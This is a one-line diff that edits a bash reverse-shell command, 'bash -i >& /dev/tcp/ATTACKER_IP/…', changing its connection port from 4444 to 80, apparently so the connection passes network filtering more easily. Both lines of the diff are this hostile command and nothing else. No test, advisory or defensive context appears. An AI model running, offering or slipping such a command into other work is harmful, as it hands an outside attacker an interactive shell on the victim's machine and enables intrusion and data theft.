@@ -1,1 +1,1 @@
-bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+bash -i >& /dev/tcp/ATTACKER_IP/80 0>&1
